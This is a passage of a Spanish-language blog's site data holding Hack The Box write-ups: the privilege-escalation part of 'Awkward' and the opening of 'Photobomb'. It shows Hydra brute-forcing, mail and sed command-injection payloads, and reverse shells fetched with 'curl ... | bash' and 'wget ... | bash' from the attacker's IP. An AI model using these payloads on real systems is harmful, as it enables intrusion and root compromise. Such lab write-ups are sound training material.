usuarios conocidos realizamos un ataque de fuerza bruta con hydra hacia la tienda, donde encontramos credenciales válidas.\n1 2 3 4 5 6 7 8 9 10 11 12 ➜ awkward hydra -L users.txt -P users.txt -f store.hat-valley.htb http-get Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-03 20:47:21 [WARNING] You must supply the web page as an additional option or via -m, default path set to / [DATA] max 16 tasks per 1 server, overall 16 tasks, 81 login tries (l:9/p:9), ~6 tries per task [DATA] attacking http-get://store.hat-valley.htb:80/ [80][http-get] host: store.hat-valley.htb login: admin password: 014mrbeanrules!#P [STATUS] attack finished for store.hat-valley.htb (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-03 20:47:22 ➜ awkward SSH Asi mismo por SSH, observamos credenciales válidas.\n1 2 3 4 5 6 7 8 9 10 11 12 ➜ awkward hydra -L users.txt -P users.txt -f ssh://hat-valley.htb Hydra v9.1 (c) 2020 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-03 20:46:57 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 81 login tries (l:9/p:9), ~6 tries per task [DATA] attacking ssh://hat-valley.htb:22/ [22][ssh] host: hat-valley.htb login: bean password: 014mrbeanrules!#P [STATUS] attack finished for hat-valley.htb (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-03 20:47:03 ➜ awkward Shell Con estas credenciales logramos obtener acceso por SSH donde realizamos la lectura de nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ➜ awkward ssh bean@hat-valley.htb # 014mrbeanrules!#P The authenticity of host \u0026#39;hat-valley.htb (10.10.11.185)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:Y3WldzAxm5ypDBD7CKdfTNWGnUu04xdwdmFIXEQOupM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;hat-valley.htb,10.10.11.185\u0026#39; (ECDSA) to the list of known hosts. bean@hat-valley.htb\u0026#39;s password: Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Dec 4 02:32:53 2022 from 10.10.14.91 bean@awkward:~$ whoami;id;pwd bean uid=1001(bean) gid=1001(bean) groups=1001(bean) /home/bean bean@awkward:~$ ls Desktop Documents Downloads Music Pictures Public Templates Videos snap user.txt bean@awkward:~$ cat user.txt 403ae4b3eca72cfa4425a95653790c5e bean@awkward:~$ Privesc Tras observar el comportamiento de scripts, binarios y solicitudes en la app web, observamos que al enviar una leave request se ejecuta un script el cual realiza un envio de mail incluyendo el nombre de usuario de la cookie en este caso christopher.jones en el subject, a christine.\n1 2 3 4 5 6 7 8 9 10 11 2022/12/04 14:26:17 CMD: UID=33 PID=3844 | 2022/12/04 14:26:17 CMD: UID=0 PID=3847 | /bin/bash /root/scripts/notify.sh 2022/12/04 14:26:17 CMD: UID=0 PID=3846 | /bin/bash /root/scripts/notify.sh 2022/12/04 14:26:17 CMD: UID=??? PID=3848 | ??? 2022/12/04 14:26:17 CMD: UID=0 PID=3850 | mail -s Leave Request: christopher.jones christine 2022/12/04 14:26:17 CMD: UID=0 PID=3849 | /bin/bash /root/scripts/notify.sh 2022/12/04 14:26:17 CMD: UID=0 PID=3851 | /usr/sbin/sendmail -oi -f root@awkward -t 2022/12/04 14:26:17 CMD: UID=0 PID=3852 | /usr/sbin/postdrop -r 2022/12/04 14:26:17 CMD: UID=33 PID=3853 | /bin/sh -c awk \u0026#39;/christopher.jones/\u0026#39; /var/www/private/leave_requests.csv 2022/12/04 14:26:17 CMD: UID=??? PID=3854 | ??? f2022/12/04 14:26:36 CMD: UID=??? PID=3855 | ??? Se observa que la hora de creación del \u0026ldquo;archivo mail\u0026rdquo; christine, coincide con la hora de ejecución del comando mail.\n1 2 3 4 5 6 7 bean@awkward:/var/mail$ ls -lah total 128K drwxrwsr-x 2 root mail 4.0K Dec 4 14:26 . drwxr-xr-x 15 root root 4.0K Oct 6 01:35 .. -rw------- 1 christine mail 31K Dec 4 14:26 christine -rw------- 1 root mail 80K Dec 4 14:20 root bean@awkward:/var/mail$ Al cambiar el nombre de usuario en la cookie y realizar el envio de una leave request observamos que tambien cambia el subject.\n1 2 3 4 5 2022/12/04 14:30:53 CMD: UID=??? PID=3940 | 2022/12/04 14:30:53 CMD: UID=??? PID=3938 | ??? 2022/12/04 14:30:53 CMD: UID=0 PID=3942 | mail -s Leave Request: testingmail christine 2022/12/04 14:30:53 CMD: UID=0 PID=3943 | /usr/sbin/sendmail -oi -f root@awkward -t 2022/12/04 14:30:53 CMD: UID=0 PID=3944 | /usr/sbin/postdrop -r El mail también es enviado al usuario que se encuentra en la cookie, al modificar al usuario \u0026lsquo;bean\u0026rsquo; se observa un mail nuevo para este usuario. Segun parece no importa el valor que se envíe en los parametros del leave request (start, end, reason) estos son tomados como parte del cuerpo del mail asi como el nombre del usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 From root@awkward Sun Dec 4 14:57:31 2022 Return-Path: \u0026lt;root@awkward\u0026gt; X-Original-To: bean@awkward Delivered-To: bean@awkward Received: by awkward.localdomain (Postfix, from userid 0) id BA9ED279C; Sun, 4 Dec 2022 14:57:31 +1100 (AEDT) Subject: Leave Request: bean To: \u0026lt;bean@awkward\u0026gt;,\u0026lt;christine@awkward\u0026gt; User-Agent: mail (GNU Mailutils 3.14) Date: Sun, 4 Dec 2022 14:57:31 +1100 Message-Id: \u0026lt;20221204035731.BA9ED279C@awkward.localdomain\u0026gt; From: root \u0026lt;root@awkward\u0026gt; X-IMAPbase: 1670128640 14 X-UID: 2 Status: O You have a new leave request to review! bean,r,oo,t,Pending Asumiendo que el script ( posiblemente notify.sh ) toma como valor el usuario de cierta forma desde el archivo leave_requests.csv, si observamos la estructura del archivo, este tiene como valor inicial el nombre del usuario por lo que estaría tomando este valor, de ser asi, es posible agregar o realizar command injection. Sin embargo existe un filtro para ciertos caracteres en la api (ver /api/submit-leave) por lo que seria imposible realizar esto.\nTras revisar \u0026lsquo;man mail\u0026rsquo; (mailutils) observamos que es posible adjuntar y ejecutar comandos ( GTFOBins - mail ).\n1 2 3 4 5 6 7 8 9 10 11 [.. snip ..] -A, --attach=FILE attach FILE [.. snip ..] -E, --exec=COMMAND execute COMMAND [.. snip ..] Suponiendo que el script toma el nombre de usuario, y al no observar el cuerpo en el comando, lo vemos de la siguiente forma, solo como una suposicion.\n1 mail -s \u0026#39;Leave Request: $USER \u0026#39; christine \u0026lt; body.txt Attach files De tal forma que si utilizamos la flag --attach=/path/to/file.txt quedaría nuestra cookie y el comando de la siguiente forma. Junto con la dirección compleda del archivo adjunto.\n1 2 3 4 5 6 7 8 9 # Cookie --\u0026gt; Username # # \u0026#39; --attach=\u0026#34;/path/to/file.txt\u0026#34; bean # # Comando # mail -s \u0026#39;Leave Request: $USER christine \u0026lt; body.txt # mail -s \u0026#39;Leave Request: \u0026#39; --attach=\u0026#34;/path/to/file.txt\u0026#34; bean christine \u0026lt; body.txt El payload quedaría de la siguiente forma realizando el escape de las comillas dobles. Dicho payload lo utilizamos para enviar un nuevo leave.\n1 2 3 4 { \u0026#34;username\u0026#34;: \u0026#34;\u0026#39; --attach=\\\u0026#34;/dev/shm/hello.txt\\\u0026#34; bean\u0026#34;, \u0026#34;iat\u0026#34;: 1670124136 } El archivo adjunto contiene una simple palabra.\n1 2 3 bean@awkward:/dev/shm$ cat hello.txt rootnt bean@awkward:/dev/shm$ Tras modificar la cookie observamos que el envió del leave request fue exitoso.\nSe muestra que el archivo .csv contiene los valores enviados.\nTras observar el mail enviado observamos que contiene adjunto el archivo especificado en la cookie en base64.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ? 5 Return-Path: \u0026lt;root@awkward\u0026gt; X-Original-To: bean@awkward Delivered-To: bean@awkward Received: by awkward.localdomain (Postfix, from userid 0) id 1338127EA; Sun, 4 Dec 2022 16:09:04 +1100 (AEDT) MIME-Version: 1.0 Content-Type: multipart/mixed; boundary=\u0026#34;1804289383-1670130544=:5983\u0026#34; Subject: Leave Request: \u0026#39; To: \u0026lt;bean@awkward\u0026gt;,\u0026lt;christine@awkward\u0026gt; User-Agent: mail (GNU Mailutils 3.14) Date: Sun, 4 Dec 2022 16:09:04 +1100 Message-Id: \u0026lt;20221204050904.1338127EA@awkward.localdomain\u0026gt; From: root \u0026lt;root@awkward\u0026gt; --1804289383-1670130544=:5983 Content-Type: text/plain; charset=UTF-8 Content-Disposition: inline Content-Transfer-Encoding: 8bit Content-ID: \u0026lt;20221204160904.5983@awkward\u0026gt; You have a new leave request to review! \u0026#39; --attach=/dev/shm/hello.txt bean,trt,toottt,tttttt,Pending --1804289383-1670130544=:5983 Content-Type: application/octet-stream; name=\u0026#34;hello.txt\u0026#34; Content-Disposition: attachment; filename=\u0026#34;hello.txt\u0026#34; Content-Transfer-Encoding: base64 Content-ID: \u0026lt;20221204160904.5983.1@awkward\u0026gt; cm9vdG50Cg== --1804289383-1670130544=:5983-- ? Dicho valor es el contenido en el archivo original, por lo que nuestro \u0026ldquo;payload\u0026rdquo; funciona correctamente.\nroot.txt Realizamos lo mismo con el archivo /root/root.txt, logrando realizar la lectura.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 ? 13 Return-Path: \u0026lt;root@awkward\u0026gt; X-Original-To: bean@awkward Delivered-To: bean@awkward Received: by awkward.localdomain (Postfix, from userid 0) id DB6DF27BC; Sun, 4 Dec 2022 16:15:22 +1100 (AEDT) MIME-Version: 1.0 Content-Type: multipart/mixed; boundary=\u0026#34;1804289383-1670130922=:6081\u0026#34; Subject: Leave Request: \u0026#39; To: \u0026lt;bean@awkward\u0026gt;,\u0026lt;christine@awkward\u0026gt; User-Agent: mail (GNU Mailutils 3.14) Date: Sun, 4 Dec 2022 16:15:22 +1100 Message-Id: \u0026lt;20221204051522.DB6DF27BC@awkward.localdomain\u0026gt; From: root \u0026lt;root@awkward\u0026gt; X-UID: 20 Status: O --1804289383-1670130922=:6081 Content-Type: text/plain; charset=UTF-8 Content-Disposition: inline Content-Transfer-Encoding: 8bit Content-ID: \u0026lt;20221204161522.6081@awkward\u0026gt; You have a new leave request to review! \u0026#39; --attach=/root/root.txt bean,trt,toottt,tttttt,Pending --1804289383-1670130922=:6081 Content-Type: application/octet-stream; name=\u0026#34;root.txt\u0026#34; Content-Disposition: attachment; filename=\u0026#34;root.txt\u0026#34; Content-Transfer-Encoding: base64 Content-ID: \u0026lt;20221204161522.6081.1@awkward\u0026gt; ODE0YzdjNTNkMmE1Y2IwYTk2NmM2ZTYwMjJhOGViYTUK --1804289383-1670130922=:6081-- ? q Saved 1 message in /home/bean/mbox Held 12 messages in /var/mail/bean bean@awkward:/var/mail$ echo ODE0YzdjNTNkMmE1Y2IwYTk2NmM2ZTYwMjJhOGViYTUK | base64 -d 814c7c53d2a5cb0a966c6e6022a8eba5 bean@awkward:/var/mail$ notify.sh Realizamos la lectura de notify.sh, observamos que nuestro supuesto comando estaba un poco cerca. Vemos que utiliza inotifywait, y obtiene el ultimo valor del archivo para enviar un mail. En este script no observamos ningun filtro por lo que si que podriamos realizar command injection si logramos modificar el archivo .csv.\n1 2 3 4 5 6 7 #!/bin/bash inotifywait --quiet --monitor --event modify /var/www/private/leave_requests.csv | while read; do change=$(tail -1 /var/www/private/leave_requests.csv) name=`echo $change | awk -F, \u0026#39;{print $1}\u0026#39;` echo -e \u0026#34;You have a new leave request to review!\\n$change\u0026#34; | mail -s \u0026#34;Leave Request: \u0026#34;$name christine done Nota: al parecer no es necesaria la comilla simple al inicio de nuestro payload (\u0026rsquo; --attach=/path/to/file user)\nSi observamos dicha carpeta que lo contiene, los unicos usuarios que tienen acceso son christine y www-data, por lo que debemos de buscar una forma para acceder a estos usuarios para modificar el .csv.\n1 2 3 4 5 6 7 8 9 10 bean@awkward:/var/mail$ ls -lah /var/www/ total 28K drwxr-xr-x 7 root root 4.0K Oct 6 01:35 . drwxr-xr-x 15 root root 4.0K Oct 6 01:35 .. drw-rwx--- 5 root www-data 4.0K Dec 20 16:53 .pm2 drwxr-xr-x 6 root root 4.0K Oct 6 01:35 hat-valley.htb drwxr-xr-x 2 root root 4.0K Oct 6 01:35 html dr-xr-x--- 2 christine www-data 4.0K Oct 6 01:35 private drwxr-xr-x 9 root root 4.0K Oct 6 01:35 store bean@awkward:/var/mail$ www-data -\u0026gt; root Si observamos, la carpeta store contiene los archivos para la tienda que encontramos en el dominio store.hat-valley.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 bean@awkward:/var/www/store$ ls -lah total 104K drwxr-xr-x 9 root root 4.0K Oct 6 01:35 . drwxr-xr-x 7 root root 4.0K Oct 6 01:35 .. -rwxr-xr-x 1 root root 918 Sep 15 20:09 README.md drwxrwxrwx 2 root root 4.0K Oct 6 01:35 cart -rwxr-xr-x 1 root root 12K Sep 15 20:09 cart.php -rwxr-xr-x 1 root root 3.6K Sep 15 20:09 cart_actions.php -rwxr-xr-x 1 root root 9.0K Sep 15 20:09 checkout.php drwxr-xr-x 2 root root 4.0K Oct 6 01:35 css drwxr-xr-x 2 root root 4.0K Oct 6 01:35 fonts drwxr-xr-x 6 root root 4.0K Oct 6 01:35 img -rwxr-xr-x 1 root root 15K Sep 15 20:09 index.php drwxr-xr-x 3 root root 4.0K Oct 6 01:35 js drwxrwxrwx 2 root root 4.0K Jan 5 10:00 product-details -rwxr-xr-x 1 root root 14K Sep 15 20:09 shop.php drwxr-xr-x 6 root root 4.0K Oct 6 01:35 static -rwxr-xr-x 1 root root 695 Sep 15 20:09 style.css bean@awkward:/var/www/store$ Comunmente el usuario www-data ejecuta nginx, por lo que analizamos los archivos de este sitio. Observamos en el archivo cart_actions.php que al eliminar un producto del carrito realiza una validación sobre un archivo existente, lo que destaca es de que, utiliza la función system(), construye y ejecuta un comando a partir de datos que son tomados de la solicitud POST.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;?php //check for valid hat valley store item function checkValidItem($filename) { if(file_exists($filename)) { $first_line = file($filename)[0]; if(strpos($first_line, \u0026#34;***Hat Valley\u0026#34;) !== FALSE) { return true; } } return false; } [.. snip ..] //delete from cart if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] === \u0026#39;delete_item\u0026#39; \u0026amp;\u0026amp; $_POST[\u0026#39;item\u0026#39;] \u0026amp;\u0026amp; $_POST[\u0026#39;user\u0026#39;]) { $item_id = $_POST[\u0026#39;item\u0026#39;]; $user_id = $_POST[\u0026#39;user\u0026#39;]; $bad_chars = array(\u0026#34;;\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;|\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;*\u0026#34;,\u0026#34;?\u0026#34;,\u0026#34;`\u0026#34;,\u0026#34;$\u0026#34;,\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;[\u0026#34;,\u0026#34;]\u0026#34;,\u0026#34;!\u0026#34;,\u0026#34;#\u0026#34;); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \u0026#34;Bad character detected!\u0026#34;; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \u0026#34;Bad character detected!\u0026#34;; exit; } } if(checkValidItem(\u0026#34;{$STORE_HOME}cart/{$user_id}\u0026#34;)) { system(\u0026#34;sed -i \u0026#39;/item_id={$item_id}/d\u0026#39; {$STORE_HOME}cart/{$user_id}\u0026#34;); echo \u0026#34;Item removed from cart\u0026#34;; } else { echo \u0026#34;Invalid item\u0026#34;; } exit; } [.. snip ..] Si intentamos tomar ventaja de la construcción y ejecucion, debemos de modificar el valor del parametro item_id, y, de alguna forma realizar bypass y ejecutar comandos utilizando sed. De igual forma se puede modificar el valor del user_id, en este caso unicamente realizamos una copia de un archivo existente en cart/ modificando el nombre, este ultimo se utilizaría como valor del parametro user_id ya que unicamente estaríamos modificando la solicitud POST.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php [.. snip ..] $item_id = $_POST[\u0026#39;item\u0026#39;]; [.. snip ..] if(checkValidItem(\u0026#34;{$STORE_HOME}cart/{$user_id}\u0026#34;)) { system(\u0026#34;sed -i \u0026#39;/item_id={$item_id}/d\u0026#39; {$STORE_HOME}cart/{$user_id}\u0026#34;); echo \u0026#34;Item removed from cart\u0026#34;; } else { echo \u0026#34;Invalid item\u0026#34;; } [.. snip ..] Realizamos una prueba agregando un producto al carrito, al eliminarlo se observa que el usuario www-data (UID 33) ejecuta el comando construido.\n1 2 3 4 2022/12/05 10:32:56 CMD: UID=??? PID=5473 | ??? 2022/12/05 10:32:56 CMD: UID=??? PID=5472 | ??? 2022/12/05 10:32:56 CMD: UID=??? PID=5471 | ??? 2022/12/05 10:33:02 CMD: UID=33 PID=5474 | sh -c sed -i \u0026#39;/item_id=1/d\u0026#39; /var/www/store/cart/e687-4f78-6dc-a346 Modificando la solicitud se observa el comando modificado.\n1 2022/12/05 10:42:30 CMD: UID=33 PID=5600 | sed -i /item_id=sckull/d /var/www/store/cart/e687-4f78-6dc-a346 sed - exec command Tras distintas pruebas y con la ayuda de GTFOBins(b) logramos crear un \u0026lsquo;payload\u0026rsquo; para ejecutar un script, localmente.\n1 2 3 4 5 6 7 # script echo \u0026#34;id\u0026gt;/tmp/id\u0026#34; \u0026gt; /dev/shm/id chmod +x /dev/shm/id # /d\u0026#39; -e \u0026#39;1e exec /dev/shm/id\u0026#39; /dev/shm/id \u0026#39; sed -i \u0026#39;/item_id=/d\u0026#39; -e \u0026#39;1e exec /dev/shm/id\u0026#39; /dev/shm/id \u0026#39;/d\u0026#39; /tmp/dir/id123abc Realizamos una prueba creando un archivo en cart/, y el script a ejecutar.\n1 2 3 4 5 6 7 8 bean@awkward:/var/www/store/cart$ nano sckull bean@awkward:/var/www/store/cart$ cat sckull ***Hat Valley bean@awkward:/var/www/store/cart$ nano /dev/shm/id bean@awkward:/var/www/store/cart$ cat /dev/shm/id id\u0026gt;/tmp/id_www bean@awkward:/var/www/store/cart$ chmod +x /dev/shm/id bean@awkward:/var/www/store/cart$ Observamos que el comando se ejecutó correctamente, vemos el contenido del comando ejecutado en /tmp/id_www.\n1 2022/12/05 10:52:49 CMD: UID=33 PID=5666 | sh -c sed -i \u0026#39;/item_id=/d\u0026#39; -e \u0026#39;1e exec /dev/shm/id\u0026#39; /dev/shm/id \u0026#39;/d\u0026#39; /var/www/store/cart/sckull 1 2 3 bean@awkward:/var/www/store/cart$ cat /tmp/id_www uid=33(www-data) gid=33(www-data) groups=33(www-data) bean@awkward:/var/www/store/cart$ Shell Ejecutamos shells, modificamos el comando a ejecutar del archivo /dev/shm/id para obtener una shell como www-data.\n1 2 3 bean@awkward:/var/www/store/cart$ cat /dev/shm/id curl 10.10.14.207/10.10.14.207:1335 | bash bean@awkward:/var/www/store/cart$ Luego de enviar nuevamente la solicitud POST obtuvimos una shell como www-data.\n1 2 3 4 5 6 7 8 9 10 ➜ ~ rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from hat-valley.htb [10.10.11.185] 39800 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@awkward:~/store$ whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/store www-data@awkward:~/store$ Mail - Exec commands Ahora teniendo acceso como www-data es posible modificar el archivo .csv, con lo cual podríamos agregar la flag para ejecucion de comandos en mail.\n1 --exec=\u0026#39;!/bin/sh\u0026#39; Creamos un archivo para ejecutar una shell inversa.\n1 2 3 4 5 bean@awkward:/var/www/store/cart$ nano /dev/shm/root bean@awkward:/var/www/store/cart$ chmod +x /dev/shm/root bean@awkward:/var/www/store/cart$ cat /dev/shm/root curl 10.10.14.207/10.10.14.207:1336 | bash bean@awkward:/var/www/store/cart$ Como sabemos el archivo csv esta constantemente observado (notify.sh) por lo que unicamente agregamos la flag para ejecutar nuestro archivo anterior.\n1 2 3 4 5 www-data@awkward:~/private$ echo \u0026#34; --exec=\\\u0026#34;\\!/dev/shm/root\\\u0026#34; bean\u0026#34; \u0026gt;\u0026gt; leav* \u0026lt; echo \u0026#34; --exec=\\\u0026#34;\\!/dev/shm/root\\\u0026#34; bean\u0026#34; \u0026gt;\u0026gt; leav* www-data@awkward:~/private$ tail -n 1 leav* --exec=\u0026#34;\\!/dev/shm/root\u0026#34; bean www-data@awkward:~/private$ Shell Finalmente obtuvimos una shell como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ➜ ~ rlwrap nc -lvp 1336 listening on [any] 1336 ... connect to [10.10.14.207] from hat-valley.htb [10.10.11.185] 49660 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /root/scripts # cd /root # ls backup root.txt scripts snap # cat root.txt 814c7c53d2a5cb0a966c6e6022a8eba5 # ","description":"En Awkward descubrimos codigo VueJs del sitio, tras analizar y explorar la API, explotamos una vulnerabilidad SSRF que nos dio acceso a la documentación de la API, luego, realizar lectura de archivos modificando el token JWT del sitio, con ello, obtener credenciales dentro de un backup y acceso por SSH. Tras el monitoreo de los procesos y comportamiento del sitio web, observamos que un script realizaba el envio de un email como root tras modificar un archivo csv, este ultimo es accesible por el sitio web el cual nos permitió unicamente la lectura de archivos por la existencia de un filtro, para saltarlo obtuvimos acceso al usuario www-data el cual permitia la escritura del csv que posteriormente nos permitió escalar privilegios.","id":5,"section":"posts","tags":["vuejs","api","ssrf","jwt","jwt token","awk","python","hydra","mailutils","php","sed"],"title":"Hack The Box - Awkward","uri":"https://sckull.github.io/posts/awkward/"},{"content":"\rEl sitio web de Photobomb permite la descarga y manipulación de imagenes, tras manipular los parametros del sitio descubrimos Command Injection esto nos permitio acceder a la máquina. Finalmente escalamos privilegios manipulando la variable de entorno PATH junto con la ejecución de un script con sudo.\nNombre Photobomb OS Linux Puntos 20 Dificultad Facil IP 10.10.11.182 Maker slartibartfast\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.4, 4.1, 4.5, 5.5, 5.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Mon Nov 7 22:31:44 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.182 Nmap scan report for 10.10.11.182 (10.10.11.182) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA) | 256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA) |_ 256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://photobomb.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Nov 7 22:31:55 2022 -- 1 IP address (1 host up) scanned in 11.08 seconds Web Site Los Headers del sitio indican una redirección al dominio photobomb.htb.\n1 2 3 4 5 6 7 8 curl -sI 10.10.11.182 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 (Ubuntu) Date: Tue, 08 Nov 2022 03:32:02 GMT Content-Type: text/html Content-Length: 154 Connection: keep-alive Location: http://photobomb.htb/ El sitio presenta información sobre \u0026lsquo;Photobomb\u0026rsquo;, se muestra la dirección /printer.\nDicha dirección necesita credenciales de acceso.\nCredentials El sitio web carga el recurso photobomb.js el cual contiene las credenciales para la dirección que encontramos anteriormente.\n1 2 3 4 5 6 7 8 // view-source:http://photobomb.htb/photobomb.js function init() { // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) { document.getElementsByClassName(\u0026#39;creds\u0026#39;)[0].setAttribute(\u0026#39;href\u0026#39;,\u0026#39;http://pH0t0:b0Mb!@photobomb.htb/printer\u0026#39;); } } window.onload = init; User - Wizard Command Injection Al ingresar observamos multiples imagenes las cuales pueden ser descargadas segun la dimension seleccionada.\nTras manipular los parametros de la solicitud de descarga encontramos dos errores en filetype y dimensions. En el primero se muestra un mensaje, de que, la copia del archivo *.jpg falló, en el segundo unicamente muestra error en dimensiones.\nEn el parametro filetype descubrimos una vulnerabilidad de blind command injection la cual nos permitió realizar un ping hacia nuestra máquina.\nShell Ejecutamos shells y la shell inversa en el sitio web.\n1 wget+-qO-+http://10.10.14.207/10.10.14.207:1338+|+bash Tras ello logramos obtener una shell como wizard.\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/htb/photobomb] └─$ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from photobomb.htb [10.10.11.182] 52852 can\u0026#39;t access tty; job control turned off $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; wizard@photobomb:~/photobomb$ whoami;pwd wizard /home/wizard/photobomb wizard@photobomb:~/photobomb$ En consecuencia nuestra flag user.txt.\n1 2 3 4 5 6 wizard@photobomb:~/photobomb$ cd wizard@photobomb:~/photobomb$ ls photobomb user.txt wizard@photobomb:~/photobomb$ cat user.txt 1d650599085807f6a1d70a149d9b0e52 wizard@photobomb:~$ Privesc El usuario wizard puede ejecutar el script cleanup.sh como root, en las opciones observamos setenv lo cual nos permitiría cambiar las variables de entorno.\n1 2 3 4 5 6 7 8 9 10 11 12 13 wizard@photobomb:~$ sudo -l -l Matching Defaults entries for wizard on photobomb: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User wizard may run the following commands on photobomb: Sudoers entry: RunAsUsers: root Options: setenv, !authenticate Commands: /opt/cleanup.sh wizard@photobomb:~$ El script realiza un cambio en los archivos de logs, observamos como ultimo comando find sin especificar la dirección completa, por lo que si podemos modificar la variable $PATH es posible ejecutar una \u0026ldquo;version\u0026rdquo; de find propia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 wizard@photobomb:~$ cat /opt/cleanup.sh #!/bin/bash . /opt/.bashrc cd /home/wizard/photobomb # clean up log files if [ -s log/photobomb.log ] \u0026amp;\u0026amp; ! [ -L log/photobomb.log 